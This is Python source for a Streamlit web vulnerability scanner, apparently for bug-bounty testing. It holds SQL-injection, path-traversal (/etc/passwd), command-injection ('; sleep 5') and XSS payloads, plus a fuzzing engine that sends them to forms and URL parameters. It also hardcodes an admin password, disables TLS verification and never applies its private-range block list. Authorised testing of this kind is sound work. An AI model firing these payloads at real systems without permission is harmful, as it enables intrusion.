"""
# ==============================================================================
# AEGIS-X: ENTERPRISE SENTINEL (v12.2 - Auto-Setup & Bounty Compliant)
# Automated Application Security Testing Framework
# ==============================================================================
#
# [REQUIREMENTS]
# Create a virtual environment and install the following:
# pip install streamlit asyncio httpx beautifulsoup4 sqlalchemy aiosqlite \
#             playwright psutil reportlab pandas aiodns
#
# [SYSTEM SETUP]
# This script includes an AUTO-SETUP function that installs Playwright and 
# Chromium automatically on the first run. No terminal access required.
#
# [COMPLIANCE NOTE]
# This scanner injects 'X-Hackerone: <USERNAME>' in all requests.
# ==============================================================================
"""

import streamlit as st
import asyncio
import httpx
import re
import json
import random
import logging
import threading
import queue
import time
import aiodns
import ipaddress
import psutil
import traceback
import base64
import pandas as pd
import subprocess
import sys
import os
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from bs4 import BeautifulSoup
from io import BytesIO

# Enterprise Libraries
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import select, String, Text, Integer, text, DateTime
from playwright.async_api import async_playwright

# Reporting
from reportlab.lib.pagesizes import LETTER
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet

# ==========================================
# 0. AUTO-SETUP (Serverless/No-Terminal Mode)
# ==========================================
def setup_env():
    """
    Automatically installs Playwright and Chromium for environments
    without terminal access (e.g., Streamlit Cloud, Hugging Face).
    Uses a lock file to prevent re-installation on every script rerun.
    """
    lock_file = "playwright.lock"
    
    if os.path.exists(lock_file):
        return

    print("⚙️ [Auto-Setup] Initializing environment...")
    
    # 1. Install Playwright Python Package
    try:
        import playwright
    except ImportError:
        print("   Installing playwright package...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])

    # 2. Install Chromium Browser
    print("   Installing Chromium browser...")
    try:
        # We use sys.executable to ensure we use the current python environment
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
    except Exception as e:
        print(f"   Warning: Browser install failed: {e}")

    # 3. Install System Dependencies (Best Effort)
    # Note: This often requires root/sudo. In restricted envs, this might fail, 
    # but Chromium often works without full deps in headless mode.
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install-deps"], check=False)
    except:
        pass

    # Create lock file to mark completion
    with open(lock_file, "w") as f:
        f.write("installed")
    
    print("✅ [Auto-Setup] Environment ready.")

# Execute Setup immediately before UI loads
setup_env()

# ==========================================
# 1. CONFIGURATION & SECURITY
# ==========================================
st.set_page_config(page_title="Aegis-X: Sentinel", layout="wide", page_icon="🛡️")

class SecurityConfig:
    ADMIN_PASSWORD = "AegisX_Sentinel_2026"
    
    # --- [IDENTITY CONFIGURATION] ---
    # REPLACE THIS WITH YOUR ACTUAL USERNAME
    BOUNTY_IDENTITY = "YOUR_USERNAME_HERE" 
    
    HEADERS = {
        "User-Agent": "Aegis-X/Sentinel (SecOps Automated Scanner)",
        "X-Hackerone": BOUNTY_IDENTITY  # Mandatory Identification Header
    }
    
    # RFC 1918 & Reserved Ranges
    BLOCKED_RANGES = [
        ipaddress.ip_network("127.0.0.0/8"),
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
        ipaddress.ip_network("169.254.0.0/16"),
        ipaddress.ip_network("::1/128"),
    ]

# ==========================================
# 2. LOGGING & OBSERVABILITY
# ==========================================
attack_queue = queue.Queue()
system_queue = queue.Queue()

class QueueHandler(logging.Handler):
    def __init__(self, target_queue):
        super().__init__()
        self.target_queue = target_queue
    def emit(self, record):
        self.target_queue.put(self.format(record))

sys_logger = logging.getLogger("Aegis-System")
sys_logger.setLevel(logging.INFO)
if not sys_logger.handlers:
    h = QueueHandler(system_queue)
    h.setFormatter(logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s', datefmt='%H:%M:%S'))
    sys_logger.addHandler(h)

atk_logger = logging.getLogger("Aegis-Attack")
atk_logger.setLevel(logging.INFO)
if not atk_logger.handlers:
    h = QueueHandler(attack_queue)
    h.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    atk_logger.addHandler(h)

# ==========================================
# 3. RESOURCE GOVERNANCE
# ==========================================
class ResourceWatchdog:
    """Monitors System RAM to prevent OOM crashes."""
    def __init__(self, threshold_percent=85):
        self.threshold = threshold_percent
        self.is_safe = asyncio.Event()
        self.is_safe.set()
        self.running = True

    async def monitor(self):
        while self.running:
            try:
                mem = psutil.virtual_memory().percent
                if mem > self.threshold:
                    if self.is_safe.is_set():
                        sys_logger.warning(f"[Watchdog] RAM Critical ({mem}%). Pausing Engine...")
                        self.is_safe.clear()
                else:
                    if not self.is_safe.is_set():
                        sys_logger.info(f"[Watchdog] RAM Stabilized ({mem}%). Resuming...")
                        self.is_safe.set()
                await asyncio.sleep(2)
            except: pass

    def stop(self): self.running = False

class AdaptiveLimiter:
    """Token Bucket algorithm for rate limiting."""
    def __init__(self, rps: float):
        self.rate = rps
        self.allowance = rps
        self.last_check = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            current = time.monotonic()
            elapsed = current - self.last_check
            self.last_check = current
            self.allowance += elapsed * self.rate
            if self.allowance > self.rate: self.allowance = self.rate
            if self.allowance < 1.0:
                await asyncio.sleep((1.0 - self.allowance) / self.rate)
                self.allowance = 0.0
            else:
                self.allowance -= 1.0

# ==========================================
# 4. DATA PERSISTENCE LAYER
# ==========================================
class Base(DeclarativeBase): pass

class Finding(Base):
    __tablename__ = "findings"
    id: Mapped[int] = mapped_column(primary_key=True)
    url: Mapped[str] = mapped_column(String)
    vuln_type: Mapped[str] = mapped_column(String)
    severity: Mapped[str] = mapped_column(String)  # Critical, High, Medium, Low
    payload: Mapped[str] = mapped_column(Text)
    evidence: Mapped[str] = mapped_column(Text)
    curl_command: Mapped[str] = mapped_column(Text)
    screenshot_b64: Mapped[str] = mapped_column(Text, nullable=True)
    remediation: Mapped[str] = mapped_column(Text)
    timestamp: Mapped[datetime] = mapped_column(default=datetime.utcnow)

class StateManager:
    def __init__(self):
        self.engine = create_async_engine("sqlite+aiosqlite:///aegis_sentinel.db", echo=False)
        self.async_session = async_sessionmaker(self.engine, expire_on_commit=False)

    async def init_db(self):
        async with self.engine.begin() as conn:
            await conn.execute(text("PRAGMA journal_mode=WAL;"))
            await conn.run_sync(Base.metadata.create_all)

    async def save_finding(self, **kwargs):
        async with self.async_session() as session:
            f = Finding(**kwargs)
            session.add(f)
            await session.commit()
            sys_logger.critical(f"[{kwargs['severity'].upper()}] {kwargs['vuln_type']} found at {kwargs['url']}")

    async def get_all_findings(self):
        async with self.async_session() as session:
            result = await session.execute(select(Finding).order_by(Finding.severity, Finding.timestamp.desc()))
            return result.scalars().all()

# ==========================================
# 5. CORE LOGIC: MINER & PAYLOADS
# ==========================================
@dataclass
class InjectionPoint:
    url: str
    method: str
    params: Dict[str, str]
    context: str = "generic" # generic, html, attr, script
    baseline_len: int = 0
    baseline_status: int = 200

class HybridMiner:
    @staticmethod
    def mine_static(url: str, html: str) -> List[InjectionPoint]:
        points = []
        soup = BeautifulSoup(html, 'html.parser')
        
        # Forms
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').upper()
            target = urljoin(url, action) if action else url
            inputs = {inp.get('name'): "AEGIS_TEST" for inp in form.find_all(['input', 'textarea']) if inp.get('name')}
            if inputs: points.append(InjectionPoint(target, method, inputs, context="html"))
            
        # URL Parameters
        if "?" in url:
            base, qs = url.split('?', 1)
            params = {k: v[0] for k,v in parse_qs(qs).items()}
            points.append(InjectionPoint(base, "GET", params, context="attr"))
            
        return points

class PayloadFactory:
    """
    Advanced Payload Generation with Encoding Bypasses.
    """
    @staticmethod
    def get_payloads(vuln_type: str, context: str = "generic") -> List[str]:
        payloads = []
        
        if vuln_type == "XSS":
            trigger = "window.AEGIS_EXECUTED()"
            base = [f"<script>{trigger}</script>", f"<img src=x onerror={trigger}>"]
            if context == "attr":
                base = [f"\"><script>{trigger}</script>", f"\" onmouseover=\"{trigger}"]
            
            # Add Encoding Bypasses
            payloads.extend(base)
            payloads.append(f"<svg/onload={trigger}>")
            payloads.append(f"javascript:{trigger}") # Protocol handler
            
        elif vuln_type == "SQLI_TIME":
            payloads = [
                "1' WAITFOR DELAY '0:0:5'--", 
                "1' AND SLEEP(5)--", 
                "1' OR SLEEP(5)--",
                "1); SELECT PG_SLEEP(5)--"
            ]
            
        elif vuln_type == "LFI":
            payloads = [
                "../../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd", # URL Encoded
                "....//....//....//etc/passwd", # Filter Bypass
                "php://filter/convert.base64-encode/resource=index.php"
            ]
            
        elif vuln_type == "RCE":
            payloads = ["; sleep 5", "| sleep 5", "&& sleep 5", "`sleep 5`"]
            
        return payloads

# ==========================================
# 6. ENGINE: FUZZER & VALIDATOR
# ==========================================
class HybridEngine:
    def __init__(self, db: StateManager, limiter: AdaptiveLimiter, watchdog: ResourceWatchdog):
        self.db = db
        self.limiter = limiter
        self.watchdog = watchdog
        # [COMPLIANCE] Injecting Mandatory Headers
        self.client = httpx.AsyncClient(
            verify=False, 
            timeout=10.0, 
            follow_redirects=True, 
            headers=SecurityConfig.HEADERS
        )
        self.validator_queue = asyncio.Queue()

    async def scan_target(self, target_url: str, stop_event: asyncio.Event):
        try:
            # 1. Discovery
            await self.limiter.acquire()
            res = await self.client.get(target_url)
            points = HybridMiner.mine_static(target_url, res.text)
            sys_logger.info(f"Discovery: Found {len(points)} injection points.")

            # 2. Fuzzing Loop
            for point in points:
                if stop_event.is_set(): break
                await self._establish_baseline(point)
                await self._fuzz_point(point)

        except Exception as e:
            sys_logger.error(f"Scan Error: {str(e)}")

    async def _establish_baseline(self, point: InjectionPoint):
        try:
            await self.limiter.acquire()
            if point.method == "GET":
                res = await self.client.get(point.url, params=point.params)
            else:
                res = await self.client.post(point.url, data=point.params)
            point.baseline_len = len(res.text)
            point.baseline_status = res.status_code
        except: pass

    async def _fuzz_point(self, point: InjectionPoint):
        vectors = ["SQLI_TIME", "LFI", "RCE"]
        
        # High-Impact Checks
        for v_type in vectors:
            for p in PayloadFactory.get_payloads(v_type, point.context):
                await self.watchdog.is_safe.wait()
                await self.limiter.acquire()
                if await self._inject(point, p, v_type): break # Stop on first find per vector

        # XSS Probe (Send to Validator)
        probe = "AEGIS_PROBE"
        if await self._inject(point, probe, "Probe", check_reflection=True):
            await self.validator_queue.put(point)

    async def _inject(self, point: InjectionPoint, payload: str, v_type: str, check_reflection=False) -> bool:
        try:
            params = point.params.copy()
            target_key = list(params.keys())[0]
            params[target_key] = payload
            
            atk_logger.info(f"[{v_type}] {point.method} {point.url} -> {payload[:20]}...")
            
            # Construct CURL for reproduction (Including Header)
            header_str = f"-H 'X-Hackerone: {SecurityConfig.BOUNTY_IDENTITY}'"
            
            start_t = time.time()
            try:
                if point.method == "GET":
                    res = await self.client.get(point.url, params=params)
                    curl = f"curl -G '{point.url}' {header_str} --data-urlencode '{target_key}={payload}'"
                else:
                    res = await self.client.post(point.url, data=params)
                    curl = f"curl -X POST '{point.url}' {header_str} -d '{target_key}={payload}'"
                elapsed = time.time() - start_t
            except httpx.TimeoutException:
                elapsed = 10.0
                res = None

            # --- ANALYSIS ---
            if v_type in ["SQLI_TIME", "RCE"] and "sleep" in payload:
                if elapsed > 4.5:
                    await self.db.save_finding(
                        url=point.url, vuln_type=v_type, severity="Critical",
                        payload=payload, evidence=f"Response delayed by {elapsed:.2f}s",
                        curl_command=curl, remediation="Sanitize inputs and use parameterized queries.",
                        screenshot_b64=None
                    )
                    return True

            if res is None: return False
            if check_reflection and payload in res.text: return True

            # Regex Checks
            patterns = {
                "LFI": (r"root:x:0:0", "High"),
                "RCE": (r"uid=\d+\(root\)", "Critical")
            }
            if v_type in patterns:
                regex, sev = patterns[v_type]
                if re.search(regex, res.text):
                    await self.db.save_finding(
                        url=point.url, vuln_type=v_type, severity=sev,
                        payload=payload, evidence=f"Regex Match: {regex}",
                        curl_command=curl, remediation="Validate input against allow-list.",
                        screenshot_b64=None
                    )
                    return True
            return False
        except: return False

    async def close(self): await self.client.aclose()

class XSSValidator:
    def __init__(self, db: StateManager, watchdog: ResourceWatchdog):
        self.db = db
        self.watchdog = watchdog

    async def worker(self, queue: asyncio.Queue, stop_event: asyncio.Event):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            
            # [COMPLIANCE] Injecting Headers into Browser Context
            context = await browser.new_context(
                user_agent=SecurityConfig.HEADERS["User-Agent"],
                extra_http_headers={"X-Hackerone": SecurityConfig.HEADERS["X-Hackerone"]},
                record_video_dir=None
            )
            
            while not stop_event.is_set():
                try:
                    try:
                        point = await asyncio.wait_for(queue.get(), timeout=1.0)
                    except asyncio.TimeoutError: continue

                    await self.watchdog.is_safe.wait()
                    page = await context.new_page()
                    
                    vuln_confirmed = False
                    async def on_exec():
                        nonlocal vuln_confirmed
                        vuln_confirmed = True
                    await page.expose_function("AEGIS_EXECUTED", on_exec)
                    
                    for payload in PayloadFactory.get_payloads("XSS", point.context):
                        params = point.params.copy()
                        target_key = list(params.keys())[0]
                        params[target_key] = payload
                        
                        try:
                            header_str = f"-H 'X-Hackerone: {SecurityConfig.BOUNTY_IDENTITY}'"
                            if point.method == "GET":
                                qs = urlencode(params)
                                await page.goto(f"{point.url}?{qs}", wait_until="domcontentloaded", timeout=5000)
                                curl = f"curl '{point.url}?{qs}' {header_str}"
                            else:
                                # Simplified POST for Playwright
                                pass 
                            
                            await page.wait_for_timeout(1000)
                            
                            if vuln_confirmed:
                                screenshot = await page.screenshot(type='jpeg', quality=50)
                                b64_img = base64.b64encode(screenshot).decode()
                                
                                await self.db.save_finding(
                                    url=point.url, vuln_type="Reflected XSS", severity="High",
                                    payload=payload, evidence="JavaScript Execution Hook Triggered",
                                    curl_command=curl, remediation="Context-aware output encoding required.",
                                    screenshot_b64=b64_img
                                )
                                break
                        except: pass
                    
                    await page.close()
                    queue.task_done()
                except Exception: pass

# ==========================================
# 7. REPORTING ENGINE (PDF)
# ==========================================
class ReportGenerator:
    @staticmethod
    def generate_pdf(findings: List[Finding]) -> bytes:
        buffer = BytesIO()
        doc = SimpleDocTemplate(buffer, pagesize=LETTER)
        styles = getSampleStyleSheet()
        elements = []

        # Header
        elements.append(Paragraph("Aegis-X: Security Assessment Report", styles['Title']))
        elements.append(Spacer(1, 12))
        elements.append(Paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}", styles['Normal']))
        elements.append(Paragraph(f"Researcher: {SecurityConfig.BOUNTY_IDENTITY}", styles['Normal']))
        elements.append(Spacer(1, 24))

        # Summary Table
        sev_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
        for f in findings:
            if f.severity in sev_counts: sev_counts[f.severity] += 1
        
        data = [["Severity", "Count"]]
        for k, v in sev_counts.items(): data.append([k, str(v)])
        
        t = Table(data)
        t.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        elements.append(t)
        elements.append(Spacer(1, 24))

        # Detailed Findings
        for f in findings:
            elements.append(Paragraph(f"[{f.severity}] {f.vuln_type}", styles['Heading2']))
            elements.append(Paragraph(f"<b>URL:</b> {f.url}", styles['Normal']))
            elements.append(Paragraph(f"<b>Payload:</b> <font name='Courier'>{f.payload}</font>", styles['Normal']))
            elements.append(Paragraph(f"<b>CURL:</b> <font name='Courier'>{f.curl_command}</font>", styles['Normal']))
            elements.append(Spacer(1, 10))
            
            if f.screenshot_b64:
                try:
                    img_data = base64.b64decode(f.screenshot_b64)
                    img_io = BytesIO(img_data)
                    img = Image(img_io, width=400, height=250)
                    elements.append(img)
                except: elements.append(Paragraph("[Screenshot Error]", styles['Normal']))
            
            elements.append(Spacer(1, 20))

        doc.build(elements)
        buffer.seek(0)
        return buffer.getvalue()

# ==========================================
# 8. TASK ORCHESTRATOR
# ==========================================
class TaskOrchestrator(threading.Thread):
    def __init__(self, target, rps):
        super().__init__()
        self.target = target
        self.rps = rps
        self.stop_event = asyncio.Event()
        self.loop = None

    def run(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self._workflow())

    async def _workflow(self):
        # Init
        db = StateManager()
        await db.init_db()
        limiter = AdaptiveLimiter(self.rps)
        watchdog = ResourceWatchdog()
        engine = HybridEngine(db, limiter, watchdog)
        validator = XSSValidator(db, watchdog)

        # Start Monitors
        asyncio.create_task(watchdog.monitor())
        val_task = asyncio.create_task(validator.worker(engine.validator_queue, self.stop_event))

        # Phase 1: Scan
        sys_logger.info("Phase 1: Discovery & Fuzzing Started...")
        await engine.scan_target(self.target, self.stop_event)
        
        # Phase 2: Validation Wait
        sys_logger.info("Phase 2: Awaiting Validation...")
        while not engine.validator_queue.empty() and not self.stop_event.is_set():
            await asyncio.sleep(1)
        
        # Cleanup
        self.stop_event.set()
        watchdog.stop()
        await engine.close()
        await val_task
        sys_logger.info("Scan Complete. Ready for Reporting.")

    def stop(self):
        if self.loop: self.loop.call_soon_threadsafe(self.stop_event.set)

# ==========================================
# 9. USER INTERFACE (STREAMLIT)
# ==========================================
def main():
    if 'auth' not in st.session_state: st.session_state['auth'] = False
    
    # Login Screen
    if not st.session_state['auth']:
        c1, c2, c3 = st.columns([1,2,1])
        with c2:
            st.title("🔒 Aegis-X Sentinel")
            pwd = st.text_input("Access Key", type="password")
            if st.button("Authenticate"):
                if pwd == SecurityConfig.ADMIN_PASSWORD:
                    st.session_state['auth'] = True
                    st.rerun()
                else: st.error("Access Denied")
        return

    # Main Dashboard
    st.title("🛡️ Aegis-X: Enterprise Sentinel")
    st.caption(f"Identity: {SecurityConfig.BOUNTY_IDENTITY} | Compliance Mode: ACTIVE")
    
    with st.sidebar:
        st.header("Mission Control")
        target = st.text_input("Target URL", "http://testphp.vulnweb.com/listproducts.php?cat=1")
        rps = st.slider("Intensity (RPS)", 1, 50, 15)
        
        if st.button("🚀 Initiate Scan"):
            if 'thread' not in st.session_state:
                t = TaskOrchestrator(target, rps)
                t.start()
                st.session_state['thread'] = t
                st.toast("Orchestrator Started")
        
        if st.button("🛑 Abort Mission"):
            if 'thread' in st.session_state:
                st.session_state['thread'].stop()
                st.session_state['thread'].join()
                del st.session_state['thread']
                st.toast("Orchestrator Stopped")

        st.divider()
        
        # Reporting
        if st.button("📄 Generate PDF Report"):
            async def fetch_report():
                db = StateManager()
                findings = await db.get_all_findings()
                return ReportGenerator.generate_pdf(findings)
            
            loop = asyncio.new_event_loop()
            pdf_bytes = loop.run_until_complete(fetch_report())
            loop.close()
            
            st.download_button(
                label="Download Report",
                data=pdf_bytes,
                file_name="Aegis_Sentinel_Report.pdf",
                mime="application/pdf"
            )

    # Real-time Monitoring
    t1, t2, t3 = st.tabs(["⚔️ Live Operations", "⚙️ System Health", "🐞 Vulnerability Vault"])

    def drain(q, k):
        if k not in st.session_state: st.session_state[k] = []
        while not q.empty(): st.session_state[k].append(q.get())
        return st.session_state[k]

    with t1:
        logs = drain(attack_queue, 'atk')
        st.code("\n".join(logs[-15:]), language="text")
        
    with t2:
        logs = drain(system_queue, 'sys')
        st.code("\n".join(logs[-15:]), language="text")

    with t3:
        async def get_db():
            db = StateManager()
            return await db.get_all_findings()
        
        try:
            loop = asyncio.new_event_loop()
            findings = loop.run_until_complete(get_db())
            loop.close()
            
            if findings:
                for f in findings:
                    color = "red" if f.severity == "Critical" else "orange" if f.severity == "High" else "blue"
                    with st.expander(f":{color}[{f.severity}] {f.vuln_type} - {f.url}"):
                        c1, c2 = st.columns(2)
                        with c1:
                            st.markdown(f"**Payload:** `{f.payload}`")
                            st.markdown(f"**Reproduction:**")
                            st.code(f.curl_command, language="bash")
                        with c2:
                            if f.screenshot_b64:
                                st.image(base64.b64decode(f.screenshot_b64), caption="Proof of Concept")
                            else:
                                st.info("No visual evidence available.")
                        st.markdown("**Remediation:**")
                        st.info(f.remediation)
            else:
                st.info("No vulnerabilities detected yet.")
        except: pass

    # Auto-refresh
    if 'thread' in st.session_state and st.session_state['thread'].is_alive():
        time.sleep(1)
        st.rerun()

if __name__ == "__main__":
    main()
